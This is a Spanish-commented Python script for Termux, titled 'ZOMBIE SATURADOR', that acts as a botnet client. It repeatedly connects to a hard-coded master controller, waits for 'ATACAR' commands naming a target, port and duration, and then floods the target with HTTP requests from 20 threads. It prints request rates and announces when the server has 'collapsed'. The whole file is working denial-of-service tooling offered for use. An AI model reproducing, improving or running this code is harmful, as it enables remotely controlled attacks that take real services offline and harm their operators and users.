#!/data/data/com.termux/files/usr/bin/python3
"""
ZOMBIE SATURADOR - GARANTIZADO
"""

import socket
import threading
import time
import random

MASTER_IP = "192.168.1.10"  # CAMBIA
MASTER_PORT = 9999

def conectar_maestro():
    while True:
        try:
            sock = socket.socket()
            sock.settimeout(30)
            sock.connect((MASTER_IP, MASTER_PORT))
            print("✅ Conectado al maestro")
            
            # Recibir ready
            sock.recv(1024)
            
            # Escuchar comandos
            while True:
                try:
                    data = sock.recv(1024).decode().strip()
                    if not data:
                        break
                    
                    if data.startswith("ATACAR|"):
                        _, target, port, secs = data.split("|")
                        port = int(port)
                        secs = int(secs)
                        
                        print(f"🔥 ATAQUE RECIBIDO: {target}:{port} por {secs}s")
                        
                        # INICIAR SATURACIÓN BRUTAL
                        threading.Thread(
                            target=saturar_servidor,
                            args=(target, port, secs),
                            daemon=True
                        ).start()
                        
                except:
                    break
                
            sock.close()
            
        except Exception as e:
            print(f"❌ Error: {e}. Reintento en 3s...")
            time.sleep(3)

def saturar_servidor(target_ip, target_port, seconds):
    """SATURACIÓN GARANTIZADA"""
    print(f"💀 INICIANDO SATURACIÓN BRUTAL")
    
    end_time = time.time() + seconds
    
    # PREPARAR REQUEST (más rápido)
    http_req = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode()
    
    # CONTADORES
    total_enviados = 0
    fallos = 0
    
    # LANZAR MÚLTIPLES ATACANTES
    def atacante_brutal():
        nonlocal total_enviados, fallos
        while time.time() < end_time:
            try:
                # SOCKET NUEVO CADA VEZ (más carga)
                s = socket.socket()
                s.settimeout(0.05)  # 50ms timeout
                s.connect((target_ip, target_port))
                s.send(http_req)
                s.close()
                total_enviados += 1
                
                # SIN SLEEP - MÁXIMA VELOCIDAD
                # time.sleep(0)  # ¡CERO SLEEP!
                
            except socket.timeout:
                fallos += 1
            except ConnectionRefusedError:
                fallos += 1
                print("🎯 ¡SERVIDOR SATURADO! Conexión rechazada")
            except:
                fallos += 1
    
    # LANZAR 20 HILOS DE ATAQUE POR ZOMBIE
    atacantes = []
    for i in range(20):
        t = threading.Thread(target=atacante_brutal)
        t.daemon = True
        atacantes.append(t)
        t.start()
    
    # MONITOR
    inicio = time.time()
    while time.time() < end_time:
        tiempo_trans = time.time() - inicio
        if tiempo_trans > 0:
            rps = total_enviados / tiempo_trans
            print(f"📊 {int(tiempo_trans)}s: {total_enviados} reqs | {rps:.0f} RPS")
        time.sleep(1)
    
    # ESPERAR
    for t in atacantes:
        t.join(timeout=1)
    
    # RESULTADO
    tiempo_total = time.time() - inicio
    rps_final = total_enviados / tiempo_total if tiempo_total > 0 else 0
    
    print(f"\n✅ SATURACIÓN COMPLETADA")
    print(f"📈 Requests enviados: {total_enviados:,}")
    print(f"❌ Fallos: {fallos:,}")
    print(f"⚡ RPS promedio: {rps_final:,.0f}")
    print(f"🎯 Target: {target_ip}:{target_port}")
    
    if fallos > total_enviados * 0.3:
        print("🔥 ¡SATURACIÓN EXITOSA! Servidor colapsado")
    else:
        print("⚠️  Servidor resistente, aumentar hilos")

if __name__ == "__main__":
    print("🤖 ZOMBIE SATURADOR ACTIVADO")
    print(f"🎯 Maestro: {MASTER_IP}:{MASTER_PORT}")
    print("💀 Listo para saturar...")
    
    conectar_maestro()
